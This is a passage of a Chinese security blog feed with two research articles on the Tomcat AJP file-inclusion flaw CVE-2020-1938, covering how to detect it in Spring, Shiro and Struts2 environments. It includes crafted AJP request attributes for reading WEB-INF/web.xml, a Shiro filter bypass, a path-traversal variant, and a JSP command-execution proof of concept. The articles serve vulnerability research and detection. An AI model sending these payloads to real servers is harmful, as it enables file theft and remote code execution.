        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;在渗透测试中遇到json数据一般都会测试下有没有反序列化。然而json库有&lt;code&gt;fastjso
      
    
    </summary>
    
      <category term="安全研究" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="fastjson" scheme="http://gv7.me/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>如何更加精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938)</title>
    <link href="http://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/"/>
    <id>http://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/</id>
    <published>2020-03-18T13:14:55.000Z</published>
    <updated>2020-03-19T07:34:35.798Z</updated>
    
    <content type="html"><![CDATA[<p>通过上篇文章<a href="http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/">《CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析》</a>，我们知道这个漏洞出现在Tomcat默认的两个<code>Servlet</code>，一个是<code>DefaultServelt</code>，可以任意文件读取。第二个是<code>JspServlet</code>，可以用于文件读取和代码执行。所以我们漏洞利用的关键是让精心构造的数据包最终让这两个<code>Servlet</code>处理。但是在真实环境下的Web项目情况很复杂，会添加自定义的<code>Servlet</code>和<code>Filter</code>，使用各种框架和组件。它们的<code>Servlet</code>和<code>Filter</code>匹配规则会影响我们构造的数据包处理流向，导致我们无法检查成功。本文我们会针对常见的5种情况并一一解决！</p><h2 id="0x01-知识储备"><a href="#0x01-知识储备" class="headerlink" title="0x01 知识储备"></a>0x01 知识储备</h2><p>在分析前我们需要对Tomcat匹配规则优先级有一个了解，匹配的优先级如下，优先级从上到下：</p><ol><li>精确匹配（例如：<code>/admin/index.html</code>）</li><li>路径匹配 (例如：/*)</li><li>拓展名匹配 (例如：<code>*.jsp</code>,<code>*.jspx</code>)</li><li>缺省匹配 （比如:<code>/</code>）</li></ol><p>具体的匹配细节可以查看Tomcat源码<code>org.apache.catalina.mapper.Mapper#internalMapWrapper()</code></p><h2 id="0x02-情况一：原生Servlet环境下"><a href="#0x02-情况一：原生Servlet环境下" class="headerlink" title="0x02 情况一：原生Servlet环境下"></a>0x02 情况一：原生Servlet环境下</h2><p>Tomcat下存在多个默认的web项目，由于它们没有使用任何框架</p><ul><li>docs</li><li>examples</li><li>host-manager</li><li>manager</li></ul><p>当没有默认的web项目，我们只能检查<code>ROOT</code>下的项目了。在使用原生Servlet开发的web应用，我们要考虑的是开发人员自定义<code>filter</code>和自定义<code>servlet</code>对漏洞影响。</p><p>按照开发经验，一般过滤器是不会过滤<code>.js</code>,<code>.css</code>,<code>.ico</code>等静态文件后缀的url，同时自定义的Servlet也不会去处理这些url。所以我们可以构造类似如下请求来绕过它们带来的影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/facvon.ico</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><h2 id="0x03-情况二：Sping-mvc环境下"><a href="#0x03-情况二：Sping-mvc环境下" class="headerlink" title="0x03 情况二：Sping mvc环境下"></a>0x03 情况二：Sping mvc环境下</h2><p>Spring MVC的经典配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath*:spring-mvc-config.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>虽然覆盖掉了<code>DefaultServlet</code>的比配路径，但是<code>*.jsp,*.jspx</code>依然会交给<code>JspServlet</code>处理，所以我们可以构造如下请求让JspServlet来触发漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/index.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>这里给大家提个问题</p><p><strong>问题：如果已经知道某个contoller使用的是jsp为视图模版来渲染数据，我们能否通过它来触发漏洞？</strong></p><p>答案：其实是不可以的。因为spring mvc会将模版渲染后，交个JspServlet去解析之前，调用<code>org.apache.catalina.core.ApplicationDispatcher#doInclude</code>方法对3个include属性进行重新赋值，也就是把我们之前设置的值覆盖掉了不再可控！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/1.png" alt="doInclude方法覆盖3个include属性"></p><h2 id="0x04-情况三：Spring-boot"><a href="#0x04-情况三：Spring-boot" class="headerlink" title="0x04 情况三：Spring boot"></a>0x04 情况三：Spring boot</h2><p>Srping boot结合Tomcat来部署有两种方式，分别是<code>外置</code>和<code>内嵌</code>。</p><h4 id="5-1-内嵌Tomcat"><a href="#5-1-内嵌Tomcat" class="headerlink" title="5.1 内嵌Tomcat"></a>5.1 内嵌Tomcat</h4><p>我们先来说内嵌，它是默认的部署方式。故名思义就是spring boot内部代码来调用Tomcat提供Web服务。这种方式默认AJP是不开启的。</p><p>若开启AJP，<code>DefaultServlet</code>的比配路径也会<code>org.springframework.web.servlet.DispatcherServlet</code>覆盖，而<code>JspServlet</code>这个是没有被注册的，因为该类在<code>jasper.jar</code>中，Spring boot默认依赖中没有。</p><p>这里值得一提的是有一种情况时可以触发漏洞的，当Spring boot需要以JSP为视图模版时，jasper.jar需要被引入。通过调试Spring boot发现会自动注册一个将<code>*.jsp</code>和<code>*.jspx</code>给<code>Jspservlet</code>的处理的<code>mapper</code>，具体参考一下两处源码。</p><p>org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory#prepareContext<br><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/2.png" alt="添加JspServlet"></p><p>org.springframework.boot.web.servlet.server.AbstractServletWebServerFactory#shouldRegisterJspServlet<br><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/3.png" alt="判断JspServlet类是否加载进来了"></p><h4 id="5-2-外置Tomcat"><a href="#5-2-外置Tomcat" class="headerlink" title="5.2 外置Tomcat"></a>5.2 外置Tomcat</h4><p>外置就是把<code>SpringBoot</code>项目打成war，部署到tomcat的webapps目录下。这种情况下的检测和Spirng MVC情况一样。</p><p>所以综合来看，内置情况下只有配置开启了<code>AJP</code>并引入了<code>jasper.jar</code>才可以被利用，这种情况少。外置情况下可以直接利用，这种情况也少。所以我认为Spring boot出现可以触发该漏洞的可能性不大。</p><h2 id="0x05-情况四：shiro环境下"><a href="#0x05-情况四：shiro环境下" class="headerlink" title="0x05 情况四：shiro环境下"></a>0x05 情况四：shiro环境下</h2><p>经典配置下shiro过滤器会对所有路径进行过滤。shiro内部对url的访问权限有如下5个属性进行管理。</p><ul><li>anon: 无需认证即可访问</li><li>authc: 需要认证才可访问</li><li>user: 点击“记住我”功能可访问</li><li>perms: 拥有权限才可以访问</li><li>role: 拥有某个角色权限才能访问</li></ul><p>假设配置如下，在为登录情况下只能访问被配置为<code>anon</code>权限的<code>login.jsp</code>，访问其他链接都会302跳转至登录页面。所以只能请求这个页面来触发漏洞了。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"shiroFilter"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.spring.web.ShiroFilterFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"securityManager"</span> <span class="attr">ref</span>=<span class="string">"securityManager"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"loginUrl"</span> <span class="attr">value</span>=<span class="string">"/login"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"unauthorizedUrl"</span> <span class="attr">value</span>=<span class="string">"/refuse.html"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"filterChainDefinitions"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">            /logout = logout</span><br><span class="line">            /login.jsp = anon</span><br><span class="line">            /** = authc</span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"successUrl"</span> <span class="attr">value</span>=<span class="string">"/index"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但我们在自动化中如何发现被配置为<code>anon</code>权限的URL呢？实验室的背影师傅给了一条很重要的提示，可以通过该漏洞设置request对象属性<code>shiroFilter: 1</code>来“关闭”shiro的拦截功能。</p><p>如果<code>request</code>对象的属性名<code>alreadyFilteredAttributeName</code>的值不为空，那么将直接交给<code>Tomcat</code>的<code>servlet</code>处理，相当于关闭了<code>shiro</code>的拦截！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/4.png" alt="判断是否已经过滤"></p><p>alreadyFilteredAttributeName变量等于<code>shiro过滤器名</code> + <code>.FILTERED</code>。</p><p>通过查看代码发现<code>shiroFilter</code>其实是<code>web.xml</code>设置的<code>shiro</code>过滤器名，这是由开发人员自定义的，故带来了新的问题。若不知道<code>shiro</code>过滤器名怎么办呢？</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/5.png" alt="已过滤属性名"></p><p>通过调试<code>shiro</code>，发现请求会被上面说的5种权限过滤器，依次匹配并处理。最重要的是它们的名字固定！于是按照同样的方法，都给它们设置上已过滤flag，即可绕过shiro的限制。具体请求构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/test.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br><span class="line">authc.FILTERED: 1</span><br><span class="line">user.FILTERED: 1</span><br><span class="line">perms.FILTERED: 1</span><br><span class="line">role.FILTERED: 1</span><br></pre></td></tr></table></figure><h2 id="0x06-情况五：Struts2环境下"><a href="#0x06-情况五：Struts2环境下" class="headerlink" title="0x06 情况五：Struts2环境下"></a>0x06 情况五：Struts2环境下</h2><p>以下分析的是Struts2 2.5.22</p><p>使用Struts2框架一般需要设置如下的全局过滤器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该过滤器默认会将后缀为<code>空</code>和<code>.action</code>的URL请求，交给<code>Struts2</code>的<code>Action</code>处理，而其他后缀就交给Tomcat默认Servlet处理，漏洞利用需要让其走后者。</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/6.png" alt="通过URL获取mapping对象，决定后续处理流程"></p><p>然而在URL获取上Struts2由别于其他环境，这是导致于其他环境利用方式不同。它通过<code>request</code>对象的<code>javax.servlet.include.servlet_path</code>属性获取，而不是<code>request.getServletPath()</code>。</p><p>org.apache.struts2.dispatcher.mapper.DefaultActionMapper#getUri()</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/7.png" alt="Struts2请求的Servlet路径是由javax.servlet.include.servlet_path属性决定"></p><p>所以我们在这里必须设置该属性值为非空非<code>.action</code>的后缀<code>test.jsp</code>,才能让Tomcat的<code>JspServlet</code>来处理。但是如果我们还是使用原来的方式读<code>/WEB-INF/web.xml</code>是行不通的，因为最终构造的路径如下是错误的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= javax.servlet.include.servlet_path + javax.servlet.include.path_info</span><br><span class="line">= /test.jsp + &apos;/WEB-INF/web.xml&apos;</span><br><span class="line">= /test.jsp/WEB-INF/web.xml (路径错误)</span><br></pre></td></tr></table></figure><p>那我们能否将<code>javax.servlet.include.path_info</code>设置为<code>/../WEB-INF/web.xml</code>来吃掉<code>1.jsp</code>形成正确路径呢？答案是可以的！可能看过我对这个漏洞分析文章的朋友会说，不是说路径里不能使用<code>../</code>进行跳目录么？上一篇文章表述由问题，其实是可以跳目录，只是不能跳出<code>webapps</code>而已。这里重新说明下路径校验函数<code>normalized()</code>的功能。</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/8.png" alt="normalized方法中和./和../的处理流程"></p><p>该方法的功能是中和掉路径中的<code>./</code>和<code>../</code>，比如<code>/a/.//b/../c</code>就会被中和为<code>/a/c</code>。如果最后依然存在<code>../</code>在开头，才会返回<code>null</code>，最终抛出非法路径的异常。</p><p>所以在<code>Struts2</code>框架下检测该漏洞，需要发包如下来绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: /../WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /1.jsp</span><br></pre></td></tr></table></figure><h2 id="0x07-演示"><a href="#0x07-演示" class="headerlink" title="0x07 演示"></a>0x07 演示</h2><p>最后便可以将以上各个场景的特点综合起来，编写扫描工具了。这里我搭建了SpringMVC + Shiro的环境进行演示。可以发现其他的url都重定向了，只有我们针对shiro构造的请求是200，并成功触发漏洞！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/9.png" alt="扫描演示"></p><h2 id="0x08-最后的话"><a href="#0x08-最后的话" class="headerlink" title="0x08 最后的话"></a>0x08 最后的话</h2><ol><li>只对每种环境较新版本进行分析，调研范围不会很全</li><li>每种环境下的检测方案，只考虑使用Tomcat默认存在缺陷的两个Servlet（<code>JspServlet</code>和<code>DefaultServlet</code>）来检测，更完美的方案应该是去找每种环境下其他存在的缺陷的Servlet。</li><li>本文提供的扫描方案不可能适配所有环境，只对精确检测做一个抛砖引玉。</li></ol><p>最后想说，涉及的环境有些多，分析得不够准确的欢迎联系我。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通过上篇文章&lt;a href=&quot;http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/&quot;&gt;《CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析》&lt;/a&gt;，我们知道这个漏洞出现在Tomcat默认的两个
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Tomcat" scheme="http://gv7.me/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析</title>
    <link href="http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/"/>
    <id>http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/</id>
    <published>2020-02-22T08:14:24.000Z</published>
    <updated>2020-02-22T09:48:33.455Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>Tomcat根据默认配置(<code>conf/server.xml</code>）启动两个连接器。一个是<code>HTTP Connector</code>默认监听<code>8080</code>端口处理HTTP请求，一个<code>AJP connector</code>默认<code>8009</code>端口处理AJP请求。Tomcat处理两个协议请求区别并不大，AJP协议相当于HTTP协议的二进制优化版。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/7F9C15E2-870C-45ED-914E-61663896B504.png" alt="tomcat默认配置两个连接器"></p><p><strong>本次漏洞出现在通过设置AJP请求属性，可控制AJP连接器封装的request对象的属性，最终导致文件包含可以任意文件读取和代码执行。</strong> 下面我们以<code>Tomcat 8.5.47</code>来具体分析。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>当我们向Tomcat发送AJP请求时，请求会被<code>org.apache.coyote.ajp.AjpProcessor</code>，<code>AjpProcessor</code>调用<code>prepareRequest</code>方法读取AJP请求中的信息来设置request属性。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/61F07938-9006-4490-AC56-738540E76D23.png" alt="对request对象属性进行设置"></p><p>由于没有任何过滤，我们可以给<code>request</code>设置任何属性和值。本次漏洞与如下三个属性有关，为了方便后续描述统一简称为“<code>三个include属性</code>”。</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><p>最终会将封装好的<code>request</code>丢给<code>Servlet</code>容器<code>Catalina</code>处理，之后就和HTTP消息的处理一样，按照Servlet映射走。</p><h4 id="2-1-任意文件读取"><a href="#2-1-任意文件读取" class="headerlink" title="2.1 任意文件读取"></a>2.1 任意文件读取</h4><p>任意文件读取问题出现在<code>org.apache.catalina.servlets.DefaultServlet</code>这个Servlet。现在假设我们发出一个请求内容如下的AJP请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/docs/test.jpg</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>通过查看servlet映射规则(<code>conf/web.xml</code>)知道，请求会走默认的<code>DefaultServlet</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">&lt;!-- The mapping for the default servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>会交给<code>org.apache.catalina.servlets.DefaultServlet</code>的<code>doGet</code>方法处理。<code>doGet</code>会调用<code>ServeResource</code>方法进行具体的资源读取操作。首先它会调用 <code>getRelativePath</code>方法获取要读取资源的相对路径，这里注意它是本次任意读取漏洞的关键，我们先往下看后续再细说它。通过<code>getResources</code>方法就可以获取到了对应路径的Web资源对象了。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/443FAD03-C388-4EC9-BB1C-90FA1AA30396.png" alt="ServeResource文件读取操作"></p><p>最后资源对象的内容随着<code>resourceBody</code>被写入了<code>ostream</code>流对象中返回给客户端。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/41165822-5864-456D-82D2-F537D3BEA2DB.png" alt="资源对象内容被写入ostream"></p><p>接下来我们来看漏洞真正核心，<code>org.apache.catalina.servlets.DefaultServlet</code>类的<code>getRelativePath()</code>，它负责获取资源的相对路径。由于我们AJP请求设置<code>javax.servlet.include.request_uri</code>属性值为<code>/</code>不为<code>null</code>。故资源<br>的相对路径构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= javax.servlet.include.path_info + javax.servlet.include.path_info</span><br><span class="line">= / + WEB-INF/web.xml</span><br><span class="line">= /WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/getRelativePath.png" alt="getRelativePath根据三个include属性获取资源相对路径"></p><p>这就导致我们虽然请求的是<code>/docs/test.jpg</code>文件内容，而实际上返回了<code>/docs/WEB-INF/web.xml</code>文件的内容。</p><p>至此大家可能有两个疑问</p><p><strong>问题1：为何Tomcat处理HTTP协议不存在该问题？</strong></p><p>答：因为在HTTP请求中，我们无法控制request对象三个<code>include</code>属性的值，而在AJP请求中可以。</p><p><strong>问题2：为何无法跳出webapps目录读文件呢？</strong></p><p><code>DefaultServlet</code>在读取资源时</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/2A1EE7C0-797C-4EF0-A60C-62BEE428403E.png" alt="跳目录读文件"></p><p>会调用<code>org.apache.tomcat.util.http.RequestUtil</code>工具类中的<code>normalize</code>方法来对路径进行校验，如果存在<code>./</code>或<code>../</code>则会返回<code>null</code>,最终会抛出一个非法路径的异常终止文件读取操作。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/473B80B4-0C17-420D-B889-7017DD18B666.png" alt="normalize对路径进行校验导致无法跳目录"></p><h4 id="2-2-任意代码执行"><a href="#2-2-任意代码执行" class="headerlink" title="2.2 任意代码执行"></a>2.2 任意代码执行</h4><p>任意代码执行问题出现在<code>org.apache.jasper.servlet.JspServlet</code>这个servlet，假设我们发出一个请求内容如下的AJP请求,让Tomcat执行<code>/docs/test.jsp</code>，但实际上它会将<code>code.txt</code>当成jsp来解析执行.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/docs/test.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: code.txt</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>code.txt内容如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.util.List&lt;String&gt; commands = <span class="keyword">new</span> java.util.ArrayList&lt;String&gt;();</span><br><span class="line">commands.add(<span class="string">"/bin/bash"</span>);</span><br><span class="line">commands.add(<span class="string">"-c"</span>);</span><br><span class="line">commands.add(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">java.lang.ProcessBuilder pb = <span class="keyword">new</span> java.lang.ProcessBuilder(commands);</span><br><span class="line">pb.start();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>按照映射规则,我们的请求会被<br><code>org.apache.jasper.servlet.JspServlet</code>进行处理。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 